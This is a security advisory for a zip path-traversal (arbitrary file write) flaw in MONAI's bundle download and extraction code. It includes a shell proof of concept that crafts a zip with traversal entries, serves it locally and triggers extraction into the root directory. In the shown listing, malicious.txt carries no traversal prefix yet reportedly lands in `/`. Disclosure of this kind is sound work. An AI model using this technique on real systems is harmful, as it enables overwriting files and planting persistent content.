# MONAI does not prevent path traversal, potentially leading to arbitrary file writes

**GHSA**: GHSA-x6ww-pf9m-m73m | **CVE**: CVE-2025-58755 | **Severity**: high (CVSS 8.8)

**CWE**: CWE-22

**Affected Packages**:
- **monai** (pip): <= 1.5.0

## Description

### Summary
The extractall function ```zip_file.extractall(output_dir)``` is used directly to process compressed files. It is used in many places in the project. When the Zip file containing malicious content is decompressed, it will overwrite the system files. In addition, the project allows the download of the zip content through the link, which increases the scope of exploitation of this vulnerability.

When reproducing locally, follow the process below to create a malicious zip file and simulate the process of remotely downloading the zip file.
```
root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# mkdir -p test_bundle
root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# echo "malicious content" > test_bundle/malicious.txt 
root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# cd test_bundle  
root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm/test_bundle# zip -r ../malicious.zip . ../../../../../../etc/passwd
  adding: malicious.txt (stored 0%)
  adding: ../../../../../../etc/passwd (deflated 64%)
root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm/test_bundle# cd ..
root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls
malicious.zip  p1.py  p2.py  r1.py  test_bundle
```
Then start the http service through python
```
root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Another terminal simulates a normal user downloading zip content from the Internet, perhaps from some popular forums or blogs, such as huggingface, etc.
```
root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# python -c "from monai.bundle.scripts import download; download(name='test_bundle', url='http://localhost:8000/malicious.zip', bundle_dir='/tmp/test_extract')"
2025-08-11 20:49:01,668 - INFO - --- input summary of monai.bundle.scripts.download ---
2025-08-11 20:49:01,668 - INFO - > name: 'test_bundle'
2025-08-11 20:49:01,668 - INFO - > bundle_dir: '/tmp/test_extract'
2025-08-11 20:49:01,668 - INFO - > source: 'monaihosting'
2025-08-11 20:49:01,668 - INFO - > url: 'http://localhost:8000/malicious.zip'
2025-08-11 20:49:01,668 - INFO - > remove_prefix: 'monai_'
2025-08-11 20:49:01,668 - INFO - > progress: True
2025-08-11 20:49:01,668 - INFO - ---


test_bundle.zip: 8.00kB [00:00, 204kB/s]
2025-08-11 20:49:01,710 - INFO - Downloaded: /tmp/test_extract/test_bundle.zip
2025-08-11 20:49:01,710 - INFO - Expected md5 is None, skip md5 check for file /tmp/test_extract/test_bundle.zip.
2025-08-11 20:49:01,710 - INFO - Writing into directory: /tmp/test_extract.
2025-08-11 20:49:01,711 - WARNING - metadata file not found in /tmp/test_extract/test_bundle/configs/metadata.json.
root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls /
autodl-pub  cuda-keyring_1.0-1_all.deb  home  lib32   **malicious.txt**  opt   run   sys  var
bin         dev                         init  lib64   media          proc  sbin  tmp
boot        etc                         lib   libx32  mnt            root  srv   usr
```
We can see that malicious.txt was indeed extracted to the root directory, demonstrating that the path traversal successfully wrote the malicious file.
If the Zip file contains SSH keys, malicious content that automatically loads when the user boots the computer, or overwrites legitimate user files, causing services to become inoperable, these actions could cause extremely serious damage.

### Impact
Arbitrary file write

### Repair Suggestions
Check the contents of the downloaded Zip file, or use a safer method to load it
